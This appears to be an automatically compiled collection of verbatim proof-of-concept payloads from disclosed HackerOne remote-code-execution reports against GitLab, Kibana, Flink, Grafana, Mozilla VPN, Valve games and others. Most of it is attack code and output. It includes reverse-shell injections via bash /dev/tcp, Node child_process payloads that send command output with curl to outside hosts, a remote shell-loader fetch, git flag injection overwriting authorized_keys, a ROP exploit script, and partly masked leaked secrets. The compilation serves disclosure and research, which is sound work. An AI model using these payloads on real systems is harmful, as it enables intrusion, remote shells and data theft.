# OS command / code injection (RCE) — verbatim payloads/PoC snippets from disclosed HackerOne reports

Auto-extracted 2026-11-12 from `data/h1` (code blocks and raw HTTP requests in the reporter's own text). Top reports by bounty, then votes. Full context: the linked report file.

## #1679624 Remote Command Execution via Github import — gitlab — $33,510 — Command Injection - Generic
Source: `hackerone/reports/2022/1679624.md` (https://hackerone.com/reports/1679624)

```
    def self.attr_accessor(*attrs)
      attrs.each do |attribute|
        class_eval do
          define_method attribute do
            @attrs[attribute.to_sym]
          end

          define_method "#{attribute}=" do |value|
            @attrs[attribute.to_sym] = value
          end

          define_method "#{attribute}?" do
            !!@attrs[attribute.to_sym]
          end
        end
      end
    end
```

```
            i = i.to_s
            command << "$#{i.bytesize}"
            command << i
```

```
       def import_repository
          project.ensure_repository

          refmap = Gitlab::GithubImport.refmap
          project.repository.fetch_as_mirror(project.import_url, refmap: refmap, forced: true)

          project.change_head(default_branch) if default_branch

          # The initial fetch can bring in lots of loose refs and objects.
          # Running a `git gc` will make importing pull requests faster.
          Repositories::HousekeepingService.new(project, :gc).execute

          true
        end
```

## #1609965 RCE via the DecompressedArchiveSizeValidator and Project BulkImports (behind feature flag) — gitlab — $33,510 — Command Injection - Generic
Source: `hackerone/reports/2022/1609965.md` (https://hackerone.com/reports/1609965)

```
      def command
        "gzip -dc #{@archive_path} | wc -c"
      end

   def validate
        pgrp = nil
        valid_archive = true

        Timeout.timeout(TIMEOUT_LIMIT) do
          stdin, stdout, stderr, wait_thr = Open3.popen3(command, pgroup: true)
          stdin.close
```

```
     def size_validator
        @size_validator ||= DecompressedArchiveSizeValidator.new(archive_path: @archive_file)
      end
```

```
PROHIBITED_REFERENCES = Regexp.union(
          /\Acached_markdown_version\Z/,
          /\Aid\Z/,
          /_id\Z/,
          /_ids\Z/,
          /_html\Z/,
          /attributes/,
          /\Aremote_\w+_(url|urls|request_header)\Z/ # carrierwave automatically creates these attribute methods for uploads
        ).freeze
```

## #591295 Potential pre-auth RCE on Twitter VPN — x — $20,160 — OS Command Injection
Source: `hackerone/reports/2019/591295.md` (https://hackerone.com/reports/591295)

```
█████████ / ████
█████████ / ██████
█████ / █████████
██████████ / █████████
███ / ██████
```

```
    # secret-key = ██████████
    ████
    dc=███,dc=duosecurity,dc=com
    cn=<USER>

    # LDAP password = ██████████
    ██████████
    █████
    ███████
    uid=<username>
    
```

```
https://0/admin/
```

## #1154542 RCE when removing metadata with ExifTool — gitlab — $20,000 — Code Injection
Source: `hackerone/reports/2021/1154542.md` (https://hackerone.com/reports/1154542)

```
(metadata
	(Copyright "\
" . qx{echo vakzz >/tmp/vakzz} . \
" b ") )
```

```
Connection from [34.74.90.73] port 12345 [tcp/*] accepted (family 2, sport 17073)
id
uid=500(git) gid=500(git) groups=500(git)
hostname -a
web-09-sv-gprd
ps auxww
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0 185524  5496 ?        Ss    2020  28:31 /sbin/init
root         2  0.0  0.0      0     0 ?        S     2020   1:44 [kthreadd]
root         4  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        I<    2020   0:00 [mm_percpu_wq]
root         7  0.0  0.0      0     0 ?        S     2020  22:50 [ksoftirqd/0]
root         8  0.1  0.0      0     0 ?        I     2020 552:25 [rcu_sched]
root         9  0.0  0.0      0     0 ?        I     2020   0:00 [rcu_bh]
root        10  0.0  0.0      0     0 ?        S     2020   1:05 [migration/0]
root        11  0.0  0.0      0     0 ?        S     2020   1:05 [watchdog/0]
root        12  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/1]
root        14  0.0  0.0      0     0 ?        S     2020   1:07 [watchdog/1]
root        15  0.0  0.0      0     0 ?        S     2020   1:03 [migration/1]
root        16  0.0  0.0      0     0 ?        S     2020  20:27 [ksoftirqd/1]
root        18  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/1:0H]
root        19  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/2]
root        20  0.0  0.0
```

```
System information
System:
Proxy:		no
Current User:	git
Using RVM:	no
Ruby Version:	2.7.2p137
Gem Version:	3.1.4
Bundler Version:2.1.4
Rake Version:	13.0.3
Redis Version:	6.0.10
Git Version:	2.29.0
Sidekiq Version:5.2.9
Go Version:	unknown

GitLab information
Version:	13.10.2-ee
Revision:	cc4224220e6
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	12.6
URL:		http://192.168.0.127:9080
HTTP Clone URL:	http://192.168.0.127:9080/some-group/some-project.git
SSH Clone URL:	git@192.168.0.127:some-group/some-project.git
Elasticsearch:	no
Geo:		no
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers:

GitLab Shell
Version:	13.17.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

## #1125425 RCE via unsafe inline Kramdown options when rendering certain Wiki pages — gitlab — $20,000 — Code Injection
Source: `hackerone/reports/2021/1125425.md` (https://hackerone.com/reports/1125425)

```
  def self.call(converter, text, lang, type, call_opts)
      opts = options(converter, type)
      call_opts[:default_lang] = opts[:default_lang]
      return nil unless lang || opts[:default_lang] || opts[:guess_lang]

      lexer = ::Rouge::Lexer.find_fancy(lang || opts[:default_lang], text)
      return nil if opts[:disable] || !lexer || (lexer.tag == "plaintext" && !opts[:guess_lang])

      opts[:css_class] ||= 'highlight' # For backward compatibility when using Rouge 2.0
      formatter = formatter_class(opts).new(opts)
      formatter.format(lexer.lex(text))
    end

  def self.formatter_class(opts = {})
      puts "formatter"
      puts opts[:formatter]
      case formatter = opts[:formatter]
      when Class
        formatter
      when /\A[[:upper:]][[:alnum:]_]*\z/
        ::Rouge::Formatters.const_get(formatter)
      else
        # Available in Rouge 2.0 or later
        ::Rouge::Formatters::HTMLLegacy
      end
    rescue NameError
      # Fallback to Rouge 1.x
      ::Rouge::Formatters::HTML
    end
```

```
{::options auto_ids="false" footnote_nr="5" syntax_highlighter="rouge" syntax_highlighter_opts="{formatter: CSV, line_numbers: true\}" /}

~~ ruby
    def what?
      42
    end
~~
```

```
    def _parse_driver(driver)
      driver = driver.to_s if driver.is_a?(Symbol)

      if driver.kind_of?(String)
        begin
          require_relative "connection/#{driver}"
        rescue LoadError, NameError => e
          begin
            require "connection/#{driver}"
          rescue LoadError, NameError => e
            raise RuntimeError, "Cannot load driver #{driver.inspect}: #{e.message}"
          end
        end

        driver = Connection.const_get(driver.capitalize)
      end

      driver
    end
```

## #658013 Git flag injection - local file overwrite to remote code execution — gitlab — $12,000 — Command Injection - Generic
Source: `hackerone/reports/2019/658013.md` (https://hackerone.com/reports/658013)

```
`curl --header "PRIVATE-TOKEN: $TOKEN" 'http://gitlab-vm.local/api/v4/projects/4/search?scope=wiki_blobs&search=page&ref=--output=/tmp/file'`
```

```
/opt/gitlab/embedded/bin/git --git-dir /var/opt/gitlab/git-data/repositories/@hashed/4b/22/4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.wiki.git log --max-count=1 --output=/tmp/file
```

```
curl --header "PRIVATE-TOKEN: $TOKEN" 'http://gitlab-vm.local/api/v4/projects/5/search?scope=wiki_blobs&search=page&ref=--output=/tmp/file'
```

## #587854 Local files could be overwritten in GitLab, leading to remote command execution — gitlab — $12,000 — Command Injection - Generic
Source: `hackerone/reports/2019/587854.md` (https://hackerone.com/reports/587854)

```
func handleArchive(ctx context.Context, writer io.Writer, in *gitalypb.GetArchiveRequest, compressCmd *exec.Cmd, format string, path string) error {                                                           
        archiveCommand, err := git.Command(ctx, in.GetRepository(), "archive",                          
                "--format="+format, "--prefix="+in.GetPrefix()+"/", in.GetCommitId(), path) 
...
```

```
$ tree
.
└── --output=
    └── var
        └── opt
            └── gitlab
                └── .ssh
                    └── authorized_keys
                        └── id_ed25519.pub
```

```
git --git-dir=DIR_TO_REPO archive --format tar --prefix=/ COMMIT_ID --output=/var/opt/gitlab/.ssh/authorized_keys
```

## #3782701 Unauthenticated RCE in Taskcluster web-server via GraphQL filter argument (sift $where) — mozilla — $12,000 — Code Injection
Source: `hackerone/reports/2026/3782701.md` (https://hackerone.com/reports/3782701)

```
import sift from 'sift';
export default (filter, array) => {
  if (!array) return [];
  return filter ? array.filter(sift(filter)) : array;
};
```

```
const $where = (params, ownerQuery, options) => {
  let test;
  if (isFunction(params)) {
    test = params;
  } else if (!process.env.CSP_ENABLED) {
    test = new Function("obj", "return " + params);   // <-- string becomes code
  } else {
    throw new Error(`In CSP mode, sift does not support strings in "$where" condition`);
  }
  return new EqualsOperation((b) => test.bind(b)(b), ownerQuery, options);
};
```

```
Query.expandScopes(scopes, filter)
  -> loaders/scopes.js : auth.expandScopes({ scopes })  then  sift(filter, expandedScopes)
```

## #733072 Path traversal, to RCE — gitlab — $12,000 — Command Injection - Generic
Source: `hackerone/reports/2022/733072.md` (https://hackerone.com/reports/733072)

```
curl -H "Private-Token: $(cat token)" http://10.26.0.5/api/v4/projects/2/packages/maven/a%2fb%2fc%2fd%2fe%2ff%2fg%2fh%2fi%2f1/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f.ssh%2fauthorized_keys -XPUT --path-as-is --data-binary @/home/asakawa/.ssh/id_rsa.pub
```

```
$ gitlab-rake gitlab:env:info

System information
System:		
Proxy:		no
Current User:	git
Using RVM:	no
Ruby Version:	2.6.3p62
Gem Version:	2.7.9
Bundler Version:1.17.3
Rake Version:	12.3.3
Redis Version:	3.2.12
Git Version:	2.22.0
Sidekiq Version:5.2.7
Go Version:	unknown

GitLab information
Version:	12.4.2-ee
Revision:	a3170599aa2
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	10.9
URL:		http://10.26.0.5
HTTP Clone URL:	http://10.26.0.5/some-group/some-project.git
SSH Clone URL:	git@10.26.0.5:some-group/some-project.git
Elasticsearch:	no
Geo:		no
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers: 

GitLab Shell
Version:	10.2.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

```
# my docker-compose.yml
version: '3'
services:
  web:
    image: 'gitlab/gitlab-ee:latest'
    restart: always
    hostname: 'localhost'
    environment:
      GITLAB_OMNIBUS_CONFIG: |
        external_url 'http://10.26.0.5'
        gitlab_rails['packages_enabled'] = true
    ports:
      - '10.26.0.5:80:80'
  #    - '10.26.0.5:22:22'
    volumes:
      - './config:/etc/gitlab'
      - './logs:/var/log/gitlab'
      - './data:/var/opt/gitlab'
      - ./crack/pub.pem:/opt/gitlab/embedded/service/gitlab-rails/.license_encryption_key.pub:ro
```

## #1168765 RCE hazard in reporting (via Chromium) — elastic — $10,000 — Privilege Escalation
Source: `hackerone/reports/2021/1168765.md` (https://hackerone.com/reports/1168765)

```
$ docker run --rm -it docker.elastic.co/kibana/kibana:7.12.0 bash  
bash-4.4$ cd ./x-pack/plugins/reporting/chromium/headless_shell-linux_x64/
bash-4.4$ ls /tmp/
ks-script-esd4my7v  ks-script-eusq_sc5
bash-4.4$ ./headless_shell --no-sandbox http://192.168.0.154:8009/alexb-says-hi.html
[0419/161441.709455:WARNING:resource_bundle.cc(431)] locale_file_path.empty() for locale
[0419/161441.725018:WARNING:resource_bundle.cc(431)] locale_file_path.empty() for locale
[0419/161441.727174:WARNING:resource_bundle.cc(431)] locale_file_path.empty() for locale
[0419/161441.821129:WARNING:resource_bundle.cc(431)] locale_file_path.empty() for locale
^C # CTRL-C after a few seconds. Reporting would kill it after a timeout
bash-4.4$ ls /tmp/
alexb-says-hi  ks-script-esd4my7v  ks-script-eusq_sc5
bash-4.4$ cat /tmp/alexb-says-hi
Linux bd1b285e33b7 4.19.121-linuxkit #1 SMP Thu Jan 21 15:36:34 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
```

## #852613 Remote Code Execution on Cloud via latest Kibana 7.6.2 — elastic — $10,000 — Privilege Escalation
Source: `hackerone/reports/2020/852613.md` (https://hackerone.com/reports/852613)

```
PUT /.kibana_1/_mappings
{
  "properties": {
    "upgrade-assistant-telemetry": {
      "properties": {
        "constructor": {
          "properties": {
            "prototype": {
              "properties": {
                "sourceURL": {
                  "type": "text",
                  "fields": {
                    "keyword": {
                      "type": "keyword",
                      "ignore_above": 256
                    }
                  }
                }
              }
            }
          }
        },
        "features": {
          "properties": {
            "deprecation_logging": {
              "properties": {
                "enabled": {
                  "type": "boolean",
                  "null_value": true
                }
              }
            }
          }
        },
        "ui_open": {
          "properties": {
            "cluster": {
              "type": "long",
              "null_value": 0
            },
            "indices": {
              "type": "long",
              "null_value": 0
            },
            "overview": {
              "type": "long",
              "null_value": 0
            }
          }
        },
        "ui_reindex": {
          "properties": {
            "close": {
              "type": "long",
              "null_value": 0
            },
            "open": {
              "type": "long",
              "null_value": 0
            },
            "start": {
              "type": "long",
       
```

```
PUT /.kibana_1/_doc/upgrade-assistant-telemetry:upgrade-assistant-telemetry
{
    "upgrade-assistant-telemetry" : {
      "ui_open.overview" : 1,
      "ui_open.cluster" : 1,
      "ui_open.indices" : 1,
      "constructor.prototype.sourceURL": "\u2028\u2029\nglobal.process.mainModule.require('child_process').exec('whoami | curl https://enba5g2t13nue.x.pipedream.net/ -d@-')"
    },
    "type" : "upgrade-assistant-telemetry",
    "updated_at" : "2020-04-17T20:47:40.800Z"
  }
```

```
    "upgrade-assistant-telemetry": {
      "properties": {
        "constructor": {
          "properties": {
            "prototype": {
              "properties": {
                "sourceURL": {
                  "type": "text",
                  "fields": {
                    "keyword": {
                      "type": "keyword",
                      "ignore_above": 256
                    }
                  }
                }
              }
            }
          }
        },
        "features": {
          "properties": {
            "deprecation_logging": {
              "properties": {
                "enabled": {
                  "type": "boolean",
                  "null_value": true
                }
              }
            }
          }
        },
        "ui_open": {
          "properties": {
            "cluster": {
              "type": "long",
              "null_value": 0
            },
            "indices": {
              "type": "long",
              "null_value": 0
            },
            "overview": {
              "type": "long",
              "null_value": 0
            }
          }
        },
        "ui_reindex": {
          "properties": {
            "close": {
              "type": "long",
              "null_value": 0
            },
            "open": {
              "type": "long",
              "null_value": 0
            },
            "start": {
              "type": "long",
              "null_value": 0
            },
       
```

## #807772 OOB reads in network message handlers leads to RCE — valve — $7,500 — Out-of-bounds Read
Source: `hackerone/reports/2021/807772.md` (https://hackerone.com/reports/807772)

```
bool _MsgFunc_GlowPropTurnOff(CCSUserMsg_GlowPropTurnOff* msg)
{
  CBaseEntity* entity = nullptr;

  int ent_idx = msg->ent_index;
  if ( ent_idx >= 0 && entitylist[ent_idx] != nullptr )
  {
    CBaseHandle* handle = entitylist[ent_idx]
    entity = handle->GetBaseEntity();  // A virtual function
  }
  
  // ...
  
  return true;
}
```

```
mov     eax, ent_idx
test    eax, eax
js      short loc_103B77A2
shl     eax, 4
mov     ecx, entitylist[eax]
```

```
from pwn import *
import textwrap

BASE_ADDRESS        = 0x287E0000
FAKE_OBJ            = BASE_ADDRESS + 0x3174F3C

SHELL_EXECUTE_ADDR  = BASE_ADDRESS + 0xA8F244

GADGET_XCHG_EAX_ESP = BASE_ADDRESS + 0xA2AAD1
GADGET_POP_ESP      = BASE_ADDRESS + 0x7E031C
GADGET_POP_EAX      = BASE_ADDRESS + 0x4a925
GADGET_POP_EDI      = BASE_ADDRESS + 0x2f00C6
GADGET_MOV_EAX_EDI  = BASE_ADDRESS + 0x74215
GADGET_MOV_EAX_EAX  = BASE_ADDRESS + 0x73c92
GADGET_XOR_EAX_EAX  = BASE_ADDRESS + 0xb4279
GADGET_XCHG_EAX_EDI = BASE_ADDRESS + 0x1da80f

def to_unicode(dword):
    a = dword & 0xffff;
    b = dword >> 16;
    return eval('u"\\u%s\\u%s"' % (hex(a)[2:].zfill(4), hex(b)[2:].zfill(4)))

def write(addr, value):
    rop = u''
    rop += to_unicode(GADGET_POP_EAX)
    rop += to_unicode(addr)
    rop += to_unicode(GADGET_POP_EDI)
    rop += to_unicode(value)
    rop += to_unicode(GADGET_MOV_EAX_EDI)
    return rop

def write_deref(addr, to_deref):
    rop = u''
    rop += to_unicode(GADGET_POP_EAX)
    rop += to_unicode(to_deref)
    rop += to_unicode(GADGET_MOV_EAX_EAX)
    rop += to_unicode(GADGET_POP_EDI)
    rop += to_unicode(addr)
    rop += to_unicode(GADGET_XCHG_EAX_EDI)
    rop += to_unicode(GADGET_MOV_EAX_EDI)
    return rop

def write_zero(addr):
    rop = u''
    rop += to_unicode(GADGET_XOR_EAX_EAX)
    rop += to_unicode(GADGET_POP_EDI)
    rop += to_unicode(addr)
    rop += to_unicode(GADGET_XCHG_EAX_EDI)
    rop += to_unicode(GADGET_MOV_EAX_EDI)
    return rop

def stack_pivot(addr):
  
```

## #3694007 Authenticated Elasticsearch Painless script execution via Query.search.sort_query on hackerone.com/graphql — security — $7,000 — Code Injection
Source: `hackerone/reports/2026/3694007.md` (https://hackerone.com/reports/3694007)

```
# /tmp/h1.headers contents:
#   accept: */*
#   content-type: application/json
#   origin: https://hackerone.com
#   referer: https://hackerone.com/notifications
#   user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36
#   x-csrf-token: <session CSRF token>
#   x-product-area: notifications
#   x-product-feature: overview
#
# $COOKIE contains the full authenticated cookie jar including __Host-session and cf_clearance.
```

```
curl -sk 'https://hackerone.com/graphql' -H @/tmp/h1.headers -b "$COOKIE" \
  --data-raw '{"query":"{me{_id username}}"}' | jq
```

```
{"data":{"me":{"_id":"████████","username":"brumbelow"}}}
```

## #682442 Git flag injection - Search API with scope 'blobs'  — gitlab — $7,000 — Command Injection - Generic
Source: `hackerone/reports/2019/682442.md` (https://hackerone.com/reports/682442)

```
curl --header "PRIVATE-TOKEN: $TOKEN" 'http://gitlab-vm.local/api/v4/projects/4/search?scope=blobs&search=.&ref=--no-index

[{"basename":null,"data":"VERSION\u00001\u0000Gitaly, version 1.53.2\n","filename":null,"id":null,"ref":"--no-index","startline":0,"project_id":4},{"basename":null,"data":"config.toml\u00001\u0000# Gitaly configuration file\nconfig.toml\u00002\u0000# This file is managed by gitlab-ctl. Manual changes will be\nconfig.toml\u00003\u0000# erased! To change the contents below, edit /etc/gitlab/gitlab.rb\nconfig.toml\u00004\u0000# and run:\nconfig.toml\u00005\u0000# sudo gitlab-ctl reconfigure\nconfig.toml\u00006\u0000\nconfig.toml\u00007\u0000socket_path = '/var/opt/gitlab/gitaly/gitaly.socket'\nconfig.toml\u00008\u0000bin_dir = '/opt/gitlab/embedded/bin'\nconfig.toml\u00009\u0000\n","filename":null,"id":null,"ref":"--no-index","startline":0,"project_id":4}]
```

```
/opt/gitlab/embedded/bin/git --git-dir /var/opt/gitlab/git-data/repositories/@hashed/6b/86/6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b.git grep --ignore-case -I --line-number --null --before-context 2 --after-context 2 --perl-regexp -e a --no-index
```

```
https://gitlab.com/api/v4/projects/2009901/search?scope=blobs&search=a&ref=--no-index

sentry_dsn = 'https://927bee37df654608xxxxxxxxxxxxxxxx:0324504ee7844264xxxxxxxxxxxxxxxx@sentry.gitlab.net/16
ruby_sentry_dsn = 'https://8ff7dd344e1d4976xxxxxxxxxxxxxxxx:bb9d785b3fe7447bxxxxxxxxxxxxxxxx@sentry.gitlab.net/29

token = 'yfZTE0Oxxxxxxx'
```

## #138869 OneLogin authentication bypass on WordPress sites via XMLRPC — uber — $7,000 — Code Injection
Source: `hackerone/reports/2016/138869.md` (https://hackerone.com/reports/138869)

```
        <param><value>cbarry@uber.com</value></param>
        <param><value>@@@nopass@@@</value></param>
```

```
        <param><value>what is this parameter</value></param>
        <param><value>(INSERT USERNAME)</value></param>
        <param><value>@@@nopass@@@</value></param>
        <param><struct>
                <member><name>post_title</name><value>bugbounty test post</value></member>
                <member><name>post_content</name><value>any HTML content here</value></member>
                <member><name>post_excerpt</name><value>excerpt</value></member>
        </struct></param>
```

```
        <param><value>what is this parameter</value></param>
        <param><value>(INSERT USERNAME)</value></param>
        <param><value>@@@nopass@@@</value></param>
        <param><struct>
                <member><name>name</name><value>file_name.html</value></member>
                <member><name>type</name><value>text/plain</value></member>
                <member><name>bits</name><value>file contents, any data format XML-encoded</value></member>
        </struct></param>
```

## #2995025 Mozilla VPN Clients: RCE via file write and path traversal — mozilla — $6,000 — Path Traversal
Source: `hackerone/reports/2025/2995025.md` (https://hackerone.com/reports/2995025)

```
QObject::connect(
      request, &NetworkRequest::requestCompleted,
      [this, path, dummy_task](const QByteArray& data) {
        dummy_task->deleteLater();
        auto temp_path = QString("%1/%2").arg(m_qml_folder, path.fileName());
        auto temp_file = new QFile(temp_path);
        temp_file->open(QIODevice::WriteOnly);
        if (!temp_file->write(data)) {
          logger.warning() << "Unable to write to file:"
                           << temp_file->fileName();
          return;
        }
        if (!temp_file->flush()) {
          logger.warning() << "Unable to flush to file:"
                           << temp_file->fileName();
          return;
        }
        temp_file->close();
        QFileInfo info(temp_path);
        annonceReplacedFile(QUrl::fromLocalFile(info.absoluteFilePath()));
      });
```

```
<script>
    var ws = new WebSocket('ws://localhost:8765/');
    var attacker_server = "███████" // needs to be HTTP, no HTTPS
    
    payload = `live_reload ${attacker_server}/..\\..\\traversal_poc.dll`

    ws.onopen = function() {
        ws.send(payload); 
    };
    ws.onmessage = function(event) {
        document.getElementById("data").innerText += event.data + "\n";
    };
 </script>
 <h1>Data retrieved:</h1>
 <div id="data"></div>
```

```
      request, &NetworkRequest::requestCompleted,
      [this, path, dummy_task](const QByteArray& data) {
        dummy_task->deleteLater();
        auto temp_path = QString("%1/%2").arg(m_qml_folder, path.fileName());
        auto temp_file = new QFile(temp_path);
        temp_file->open(QIODevice::WriteOnly);
        if (!temp_file->write(data)) {
          logger.warning() << "Unable to write to file:"
                           << temp_file->fileName();
          return;
        }
        if (!temp_file->flush()) {
          logger.warning() << "Unable to flush to file:"
                           << temp_file->fileName();
          return;
        }
        temp_file->close();
        QFileInfo info(temp_path);
        annonceReplacedFile(QUrl::fromLocalFile(info.absoluteFilePath()));
      });
```

## #1418891 Apache Flink RCE via GET jar/plan API Endpoint — aiven_ltd — $6,000 — Command Injection - Generic
Source: `hackerone/reports/2022/1418891.md` (https://hackerone.com/reports/1418891)

```
GET /jars/145df7ff-c71a-4f3a-b77a-ee4055b1bede_a.jar/plan?entry-class=com.sun.tools.script.shell.Main&programArg=-e,load("https://fs.bugbounty.jarijaas.fi/aiven-flink/shell-loader.js")&parallelism=1 HTTP/1.1
Host: ████
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
Authorization: Basic █████
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"
Accept: application/json, text/plain, */*
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
sec-ch-ua-platform: "Windows"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Language: en-US,en;q=0.9,fi;q=0.8
```

```
GET /jars/145df7ff-c71a-4f3a-b77a-ee4055b1bede_a.jar/plan?entry-class=com.sun.tools.script.shell.Main&programArg=-e,load("https://fs.bugbounty.jarijaas.fi/aiven-flink/shell-loader.js")&parallelism=1 HTTP/1.1
Host: ████
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
Authorization: Basic █████
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"
Accept: application/json, text/plain, */*
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
sec-ch-ua-platform: "Windows"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Language: en-US,en;q=0.9,fi;q=0.8
'''

## Impact
```

## #1200647 Grafana RCE via SMTP server parameter injection — aiven_ltd — $5,000 — CRLF Injection
Source: `hackerone/reports/2022/1200647.md` (https://hackerone.com/reports/1200647)

```
PUT /v1/project/PROJECT_NAME/service/GRAFANA_INSTANCE_NAME HTTP/1.1
Host: console.aiven.io
Connection: keep-alive
Accept: application/json
Authorization: aivenv1 AIVEN_TOKEN_HERE
X-Aiven-Client-Version: aiven-console/3.5.1-1104.g2809991854
Content-Type: application/json
Origin: https://console.aiven.io

{
    "user_config": {
        "smtp_server": {
            "host": "example.org",
            "port": 1,
            "from_address": "x@examle.org",
            "password": "x\r\n[plugin.grafana-image-renderer]\r\nrendering_args=--renderer-cmd-prefix=bash -c bash$IFS-l$IFS>$IFS/dev/tcp/SERVER_IP/4444$IFS0<&1$IFS2>&1"
        }
    }
}
```

```
PUT /v1/project/PROJECT_NAME/service/GRAFANA_INSTANCE_NAME HTTP/1.1
Host: console.aiven.io
Connection: keep-alive
Accept: application/json
Authorization: aivenv1 AIVEN_TOKEN_HERE
X-Aiven-Client-Version: aiven-console/3.5.1-1104.g2809991854
Content-Type: application/json
Origin: https://console.aiven.io

{
```

```
    "user_config": {
        "smtp_server": {
            "host": "example.org",
            "port": 1,
            "from_address": "x@examle.org",
            "password": "x\r\n[plugin.grafana-image-renderer]\r\nrendering_args=--renderer-cmd-prefix=bash -c bash$IFS-l$IFS>$IFS/dev/tcp/SERVER_IP/4444$IFS0<&1$IFS2>&1"
        }
    }
```

## #861744 Remote Code Execution in coming Kibana 7.7.0 — elastic — $5,000 — Privilege Escalation
Source: `hackerone/reports/2021/861744.md` (https://hackerone.com/reports/861744)

```
{"actions":[],"created_at":"2020-04-28T17:19:42.955Z","updated_at":"2020-04-28T18:02:32.489Z","created_by":"elastic","description":"test","enabled":true,"anomaly_threshold":0,"false_positives":[],"from":"now-108015s","id":"ac26797b-9061-485c-889c-79993ca8e209","immutable":false,"interval":"15s","rule_id":"2a5a3f8e-79a9-4101-99d9-b414ed48c0db","output_index":".siem-signals-default","max_signals":100,"machine_learning_job_id":"linux_anomalous_network_activity_ecs","risk_score":50,"name":"test","references":[],"meta":{"from":"30h","kibana_siem_app_url":"https://localhost:5601/app/siem"},"severity":"low","updated_by":"elastic","tags":[],"to":"now","type":"machine_learning","threat":[],"throttle":"no_actions","version":3}
{"exported_count":1,"missing_rules":[],"missing_rules_count":0}
```

```
PUT /.ml-anomalies-custom-linux_anomalous_network_activity_ecs/_doc/my-anomaly?refresh
{
  "timestamp": 1588093630045,
  "result_type": "record",
  "record_score": 1,
  "job_id": "linux_anomalous_network_activity_ecs",
  "by_field_name": "field_name",
  "by_field_value": "field_value",
  "influencers": [
    {"influencer_field_name": "foo.__proto__.sourceURL", "influencer_field_values": "\u2028\u2029\n;global.process.mainModule.require('child_process').exec('say pwned && open https://www.youtube.com/watch?v=LUsiFV3dsK8')"}
    ]
}
```

```
    {"influencer_field_name": "foo.__proto__.sourceURL", "influencer_field_values": "\u2028\u2029\n;global.process.mainModule.require('child_process').exec('say pwned && open https://www.youtube.com/watch?v=LUsiFV3dsK8')"}
    ]
```

## #1776476 CVE-2022-40127: RCE in Apache Airflow <2.4.0 bash example — ibb — $4,000 — Code Injection
Source: `hackerone/reports/2023/1776476.md` (https://hackerone.com/reports/1776476)

```
    also_run_this = BashOperator(
        task_id='also_run_this',
        bash_command='echo "run_id={{ run_id }} | dag_run={{ dag_run }}"',
    )
```

## #653125 Git flag injection leading to file overwrite and potential remote code execution — gitlab — $3,500 — Command Injection - Generic
Source: `hackerone/reports/2019/653125.md` (https://hackerone.com/reports/653125)

```
curl 'http://4290d4225642/api/v4/projects/5/repository/commits?path=.&ref_name=--output=/tmp/written'
```

```
# ls -asl /tmp/written
0 -rw-r--r-- 1 git git 0 Jul 22 14:56 /tmp/written
```

```
# gitlab-ctl restart unicorn
ok: run: unicorn: (pid 46755) 1s
root@4290d4225642:/var/opt/gitlab/gitlab-rails/etc# cat gitlab_shell_secret
████████
``

This then allows for use of the internal api:
```

## #513154 Unchecked weapon id in WeaponList message parser on client leads to RCE — valve — $3,000 — Array Index Underflow
Source: `hackerone/reports/2019/513154.md` (https://hackerone.com/reports/513154)

```
int CHudAmmo::MsgFunc_WeaponList(const char *pszName, int iSize, void *pbuf )
{
	BEGIN_READ( pbuf, iSize );
	
	WEAPON Weapon;

	strcpy( Weapon.szName, READ_STRING() );
	Weapon.iAmmoType = (int)READ_CHAR();	
	
	Weapon.iMax1 = READ_BYTE();
	if (Weapon.iMax1 == 255)
		Weapon.iMax1 = -1;

	Weapon.iAmmo2Type = READ_CHAR();
	Weapon.iMax2 = READ_BYTE();
	if (Weapon.iMax2 == 255)
		Weapon.iMax2 = -1;

	Weapon.iSlot = READ_CHAR();
	Weapon.iSlotPos = READ_CHAR();
	Weapon.iId = READ_CHAR();
	Weapon.iFlags = READ_BYTE();
	Weapon.iClip = 0;

	gWR.AddWeapon( &Weapon );

	return 1;
}
```

```
void AddWeapon( WEAPON *wp ) 
{ 
		rgWeapons[ wp->iId ] = *wp;	
		LoadWeaponSprites( &rgWeapons[ wp->iId ] );
}
```

## #1401444 RCE via WikiCloth markdown rendering if the `rubyluabridge` gem is installed — gitlab — $3,000 — OS Command Injection
